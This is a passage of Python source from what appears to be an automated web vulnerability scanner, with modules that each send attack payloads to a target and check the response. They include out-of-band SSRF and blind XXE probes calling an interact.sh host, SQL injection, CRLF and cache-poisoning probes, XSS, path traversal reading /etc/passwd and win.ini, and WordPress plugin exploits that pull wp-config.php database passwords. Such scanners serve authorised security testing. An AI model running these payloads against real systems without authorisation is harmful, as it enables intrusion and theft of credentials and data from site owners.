  urlList = ['/?u=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&href=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&action=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&host=0000nlm6c0j53v2s668g61398133715me.interact.sh&http_host=0000nlm6c0j53v2s668g61398133715me.interact.sh&email=root@0000nlm6c0j53v2s668g61398133715me.interact.sh&url=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&load=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&preview=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&target=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&proxy=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&from=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&src=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&ref=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/&referrer=http://0000nlm6c0j53v2s668g61398133715me.interact.sh/']
  redirAllow = False
  # statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# oob-header-based-interaction
def attMOD240(progScope):
  myKey = "7c8617b7ca8580a4ac17d7d40cd1c22e"
  vulnCat = "OOB-SSRF"
  vulnName = "oob-header-based-interaction"
  severity = "P4"
  vulnDsc = "Header Based Generic OOB Interaction"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@0000nlm6c0j53v2s668g61398133715me.interact.sh','Referer':'http://0000nlm6c0j53v2s668g61398133715me.interact.sh/ref','Cf-Connecting_ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Real-Ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','From':'root@0000nlm6c0j53v2s668g61398133715me.interact.sh','True-Client-Ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','Client-Ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','Forwarded':'for=spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh;by=spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh;host=spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Client-Ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Originating-Ip':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Wap-Profile':'http://0000nlm6c0j53v2s668g61398133715me.interact.sh/wap.xml','X-Forwarded-For':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','Contact':'root@0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Forwarded-Host':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Host':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-Forwarded-Server':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','X-HTTP-Host-Override':'spoofed.0000nlm6c0j53v2s668g61398133715me.interact.sh','Cache-Control':'no-transform'}
  reqMethod = ""
  postData = ""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# generic-blind-xxe
def attMOD241(progScope):
  myKey = "75490405742c0319ecd1c9adf90a40d5"
  vulnCat = "XXE"
  vulnName = "generic-blind-xxe"
  severity = "P2"
  vulnDsc = "Generic Blind XXE"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
  reqMethod = "POST"
  postData = """<?xml version="1.0"?>
        <!DOCTYPE foo SYSTEM "http://0000nlm6c0j53v2s668g61398133715me.interact.sh">
        <foo>&e1;</foo>"""
  urlList = ['/']
  redirAllow = False
  statusF = 200
  textF = 'em51733189316g866s2v35j0c6mln0000'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# error-based-sql-injection
def attMOD242(progScope):
  myKey = "b5425064aec01357c37ab7c4045d9aa2"
  vulnCat = "SQLi"
  vulnName = "error-based-sql-injection"
  severity = "P1"
  vulnDsc = "Error based SQL injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ["/'"]
  redirAllow = False
  # statusF = 200
  textF = 'SQL syntax'
  condition = lambda z : True if( (textF in z.text or 'MySQLSyntaxErrorException' in z.text or 'valid MySQL result' in z.text or ' your MySQL server version' in z.text or 'MySqlClient' in z.text or '_Mysqli_Exception' in z.text or 'MySqlException' in z.text or ': Syntax error or access violation' in z.text or 'check the manual that corresponds to your MariaDB server version' in z.text or 'MemSQL does not support this type of query' in z.text or 'is not supported by MemSQL' in z.text or 'syntax error at or near' in z.text or 'ERROR: parser: parse error at or near' in z.text or 'PostgreSQL query failed' in z.text or 'Microsoft SQL Native Client error' in z.text or 'ODBC SQL Server Driver' in z.text or 'SQLServer JDBC Driver' in z.text or 'Unclosed quotation mark after the character string' in z.text or 'Syntax error \\(missing operator\\) in query expression' in z.text or 'ODBC Microsoft Access' in z.text or 'quoted string not properly terminated' in z.text or 'SQL command not properly ended' in z.text or 'DB2 SQL error' in z.text or 'SQLite error ' in z.text or 'SQL error' in z.text or 'UNION query has different number of fields' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# crlf-injection
def attMOD243(progScope):
  myKey = "e7eb967055a9b52f133e8733e1f673dc"
  vulnCat = "CRLF"
  vulnName = "crlf-injection"
  severity = "P4"
  vulnDsc = "CRLF injection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/%0D%0ASet-Cookie:crlfinjection=crlfinjection','/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=crlfinjection','/%0DSet-Cookie:crlfinjection=crlfinjection','/%0ASet-Cookie:crlfinjection=crlfinjection','/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection','/%0ASet-Cookie%3Acrlfinjection/..','/?Page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&callback=%0D%0ASet-Cookie:crlfinjection=crlfinjection&checkout_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&content=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continue=%0D%0ASet-Cookie:crlfinjection=crlfinjection&continueTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&counturl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&data=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dest_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&dir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&document=%0D%0ASet-Cookie:crlfinjection=crlfinjection&domain=%0D%0ASet-Cookie:crlfinjection=crlfinjection&done=%0D%0ASet-Cookie:crlfinjection=crlfinjection&download=%0D%0ASet-Cookie:crlfinjection=crlfinjection&feed=%0D%0ASet-Cookie:crlfinjection=crlfinjection&file=%0D%0ASet-Cookie:crlfinjection=crlfinjection&host=%0D%0ASet-Cookie:crlfinjection=crlfinjection&html=%0D%0ASet-Cookie:crlfinjection=crlfinjection&http=%0D%0ASet-Cookie:crlfinjection=crlfinjection&https=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&image_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&imageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&include=%0D%0ASet-Cookie:crlfinjection=crlfinjection&media=%0D%0ASet-Cookie:crlfinjection=crlfinjection&navigation=%0D%0ASet-Cookie:crlfinjection=crlfinjection&next=%0D%0ASet-Cookie:crlfinjection=crlfinjection&open=%0D%0ASet-Cookie:crlfinjection=crlfinjection&out=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page=%0D%0ASet-Cookie:crlfinjection=crlfinjection&page_url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&pageurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&picture=%0D%0ASet-Cookie:crlfinjection=crlfinjection&port=%0D%0ASet-Cookie:crlfinjection=crlfinjection&proxy=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redir=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirectUri&redirectUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&reference=%0D%0ASet-Cookie:crlfinjection=crlfinjection&referrer=%0D%0ASet-Cookie:crlfinjection=crlfinjection&req=%0D%0ASet-Cookie:crlfinjection=crlfinjection&request=%0D%0ASet-Cookie:crlfinjection=crlfinjection&retUrl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return=%0D%0ASet-Cookie:crlfinjection=crlfinjection&returnTo=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_path=%0D%0ASet-Cookie:crlfinjection=crlfinjection&return_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&rurl=%0D%0ASet-Cookie:crlfinjection=crlfinjection&show=%0D%0ASet-Cookie:crlfinjection=crlfinjection&site=%0D%0ASet-Cookie:crlfinjection=crlfinjection&source=%0D%0ASet-Cookie:crlfinjection=crlfinjection&src=%0D%0ASet-Cookie:crlfinjection=crlfinjection&target=%0D%0ASet-Cookie:crlfinjection=crlfinjection&to=%0D%0ASet-Cookie:crlfinjection=crlfinjection&uri=%0D%0ASet-Cookie:crlfinjection=crlfinjection&url=%0D%0ASet-Cookie:crlfinjection=crlfinjection&val=%0D%0ASet-Cookie:crlfinjection=crlfinjection&validate=%0D%0ASet-Cookie:crlfinjection=crlfinjection&view=%0D%0ASet-Cookie:crlfinjection=crlfinjection&window=%0D%0ASet-Cookie:crlfinjection=crlfinjection&redirect_to=%0D%0ASet-Cookie:crlfinjection=crlfinjection','/?Test=%0D%0ASet-Cookie:crlfinjection=crlfinjection']
  redirAllow = False
  # statusF = 30
  textF = 'crlfinjection=crlfinjection'
  # condition = lambda z : True if( (statusF in z.status_code) and (textF in z.headers['Set-Cookie']) ) else False
  condition = lambda z : True if( (textF in z.headers['Set-Cookie']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# cache-poisoning
def attMOD244(progScope):
  myKey1 = "a35e7f00ce72fd4e6c07fe186359e8b9"
  vulnCat = "CachePoisoning"
  vulnName = "cache-poisoning"
  severity = "P2"
  vulnDsc = "Cache Poisoning"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'X-Forwarded-Prefix': 'iputWASHEREandTHERE133714',
        'X-Forwarded-Host': 'iputWASHEREandTHERE133715',
        'X-Forwarded-For': 'iputWASHEREandTHERE133716',
        'Forwarded': 'by=iputWASHEREandTHERE133717;for=iputWASHEREandTHERE133718;host=iputWASHEREandTHERE133719;'}
  reqMethod = ""
  postData = ""
  urlList = ['/?iput007=iput007','/index.html?jquery.js=iput007']
  redirAllow = False
  statusF = 900
  textF = 'iputWASHEREandTHERE13371'
  condition1 = lambda z : True if( z.status_code == statusF ) else False # Always false :D
  # condition = lambda z : True if( str(textF).lower() in str(z.text).lower() ) else False
  
  targetAttackLauncher(myKey1,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition1,customHeaders,reqMethod,postData)
  
  myKey2 = "6e52911b91a051a2b5ed07e2e68a1297"
  vulnCat = "CachePoisoning"
  vulnName = "cache-poisoning"
  severity = "P2"
  vulnDsc = "Cache Poisoning"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?iput007=iput007','/index.html?jquery.js=iput007']
  redirAllow = False
  statusF = 900
  textF = 'iputWASHEREandTHERE13371'
  # condition1 = lambda z : True if( z.status_code == statusF ) else False # Always false :D
  condition = lambda z : True if( str(textF).lower() in str(z.text).lower() ) else False
  
  targetAttackLauncher(myKey2,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# basic-xss-prober
def attMOD245(progScope):
  myKey = "f9f746965614659eae6c11fae005eacd"
  vulnCat = "RXSS"
  vulnName = "basic-xss-prober"
  severity = "P3"
  vulnDsc = "Basic XSS Prober"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e']
  redirAllow = False
  statusF = 200
  textF = '"><injectable>'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# generic-linux-lfi
def attMOD246(progScope):
  myKey = "933b5247fce7c9c658fd4c47fb883f5b"
  vulnCat = "LFI"
  vulnName = "generic-linux-lfi"
  severity = "P2"
  vulnDsc = "Generic Linux based LFI Test"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/etc/passwd','/..%5cetc/passwd','/..%5c..%5cetc/passwd','/..%5c..%5c..%5cetc/passwd','/..%5c..%5c..%5c..%5cetc/passwd','/..%5c..%5c..%5c..%5c..%5cetc/passwd','/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd','/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd','/static/..%5cetc/passwd','/static/..%5c..%5cetc/passwd','/static/..%5c..%5c..%5cetc/passwd','/static/..%5c..%5c..%5c..%5cetc/passwd','/static/..%5c..%5c..%5c..%5c..%5cetc/passwd','/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd','/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd','/./../../../../../../../../../../etc/passwd','/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd','/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd','/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd','/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd','/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd','/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# generic-windows-lfi
def attMOD247(progScope):
  myKey = "cebddf2b74975c9040492c2055723699"
  vulnCat = "LFI"
  vulnName = "generic-windows-lfi"
  severity = "P2"
  vulnDsc = "Generic Windows based LFI Test"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini','/./../../../../../../../../../../windows/win.ini','/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini','/.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini','/%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini','/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini','/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini','/?redirect=..%2f..%2f..%2f..%2fwindows/win.ini','/?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini','/?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini']
  redirAllow = False
  statusF = 200
  textF = 'bit app support'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'fonts' in z.text and 'extensions' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# advanced-access-manager-lfi
def attMOD248(progScope):
  myKey = "61d49b4982e1fd779dbdbfc286757758"
  vulnCat = "LFI"
  vulnName = "advanced-access-manager-lfi"
  severity = "P2"
  vulnDsc = "Advanced Access Manager < 5.9.9 - Unauthenticated Local File Inclusion"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?aam-media=wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# aspose-file-download
def attMOD249(progScope):
  myKey = "6cb5447dedb1335d92e72aaf6317a4c4"
  vulnCat = "Exposure"
  vulnName = "aspose-file-download"
  severity = "P2"
  vulnDsc = "Aspose Cloud eBook Generator - File Download"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# brandfolder-lfi
def attMOD250(progScope):
  myKey = "e74e040af3a8c659c3775d7f1103051a"
  vulnCat = "LFI/RFI"
  vulnName = "brandfolder-lfi"
  severity = "P2"
  vulnDsc = "Wordpress brandfolder plugin - RFI & LFI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# brandfolder-open-redirect
def attMOD251(progScope):
  myKey = "833ab51428b9ee4bd07c058d4877f049"
  vulnCat = "OpenRedirect"
  vulnName = "brandfolder-open-redirect"
  severity = "P4"
  vulnDsc = "WordPress Brandfolder Plugin Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/brandfolder/callback.php?wp_abspath=https://example.com/']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# cherry-file-download
def attMOD252(progScope):
  myKey = "26e58e6f156c936ec8e712003c64065c"
  vulnCat = "LFI"
  vulnName = "cherry-file-download"
  severity = "P2"
  vulnDsc = "Cherry Plugin < 1.2.7 - Unauthenticated Arbitrary File Download"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/cherry-plugin/admin/import-export/download-content.php?file=../../../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# church-admin-lfi
def attMOD253(progScope):
  myKey = "a37fa8bcddc893b90a380df44b83028d"
  vulnCat = "LFI"
  vulnName = "church-admin-lfi"
  severity = "P2"
  vulnDsc = "Church Admin 0.33.2.1 - Unauthenticated Directory Traversal"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# easy-media-gallery-pro-listing
def attMOD254(progScope):
  myKey = "b34e6d13ddb0a0bc0800e79105a04b76"
  vulnCat = "DirListing"
  vulnName = "easy-media-gallery-pro-listing"
  severity = "P4"
  vulnDsc = "WordPress Plugin Media Gallery Pro Listing"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/easy-media-gallery-pro/']
  redirAllow = False
  statusF = 200
  textF = 'Index of'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'wp-content/plugins/easy-media-gallery-pro/' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# easy-wp-smtp-listing
def attMOD255(progScope):
  myKey = "77b5aa34eb3a0e623aae1bbfef05fd7c"
  vulnCat = "Exposure"
  vulnName = "easy-wp-smtp-listing"
  severity = "P4"
  vulnDsc = "SMTP WP Plugin Directory listing enabled"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/easy-wp-smtp/']
  redirAllow = False
  statusF = 200
  textF = 'Index of'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'debug' in z.text and 'log' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# eatery-restaurant-open-redirect
def attMOD256(progScope):
  myKey = "c285e32ab438ff34801a3c8f3fded3e8"
  vulnCat = "OpenRedirect"
  vulnName = "eatery-restaurant-open-redirect"
  severity = "P4"
  vulnDsc = "WordPress Attitude Themes 1.1.1 Open Redirection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/eatery/nav.php?-Menu-=https://example.com/']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# issuu-panel-lfi
def attMOD257(progScope):
  myKey = "78afb1cb745ae9149df2aedb08775580"
  vulnCat = "LFI"
  vulnName = "issuu-panel-lfi"
  severity = "P2"
  vulnDsc = "Wordpress Plugin Issuu Panel - RFI & LFI"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/issuu-panel/menu/documento/requests/ajax-docs.php?abspath=%2Fetc%2Fpasswd']
  redirAllow = False
  statusF = 200
  textF = 'root:x:0:0:'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# nativechurch-wp-theme-lfd
def attMOD258(progScope):
  myKey = "09494ad49b97a833ee5c16e3d8836856"
  vulnCat = "FileDownload"
  vulnName = "nativechurch-wp-theme-lfd"
  severity = "P2"
  vulnDsc = "A LFD Bug In download.php File In NativeChurch Theme And Make Site Vulnerable."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php']
  redirAllow = False
  statusF = 200
  textF = 'DB_NAME'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'DB_PASSWORD' in z.text and 'DB_HOST' in z.text and 'The base configurations of the WordPress' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# sassy-social-share-xss
def attMOD259(progScope):
  myKey = "cc3904b85bf59841f5e0db4f908f11c9"
  vulnCat = "RXSS"
  vulnName = "sassy-social-share-xss"
  severity = "P3"
  vulnDsc = ""
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=']
  redirAllow = False
  statusF = 200
  textF = '[{"<img src=x onerror=alert(document.domain)>":""}]'
  condition = lambda z : True if( (z.status_code == statusF) and ('you have been blocked' not in z.text and textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# ultimatemember-open-redirect
def attMOD260(progScope):
  myKey = "814a1318029d78073ba9b0c6c4a04443"
  vulnCat = "OpenRedirect"
  vulnName = "ultimatemember-open-redirect"
  severity = "P3"
  vulnDsc = "Ultimate Member < 2.1.7 - Unauthenticated Open Redirect"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/register/?redirect_to=https://example.com/']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# w3c-total-cache-ssrf
def attMOD261(progScope):
  myKey = "e4adc00bff25440fdd51f5f80f7b0f54"
  vulnCat = "SSRF"
  vulnName = "w3c-total-cache-ssrf"
  severity = "P3"
  vulnDsc = "Wordpress W3C Total Cache SSRF <= 0.9.4"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css']
  redirAllow = False
  statusF = 200
  textF = 'NessusFileIncludeTest'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# weekender-newspaper-open-redirect
def attMOD262(progScope):
  myKey = "202019260f70b286cd17e15e972854f7"
  vulnCat = "OpenRedirect"
  vulnName = "weekender-newspaper-open-redirect"
  severity = "P4"
  vulnDsc = "WordPress Weekender Newspaper Themes 9.0 - Open Redirection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/themes/weekender/friend.php?id=MTA0&link=aHR0cHM6Ly9leGFtcGxlLmNvbQ==']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF or z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wordpress-accessible-wpconfig
def attMOD263(progScope):
  myKey = "87e62733f7d81a8868bc2077bee35ee1"
  vulnCat = "Disclosure"
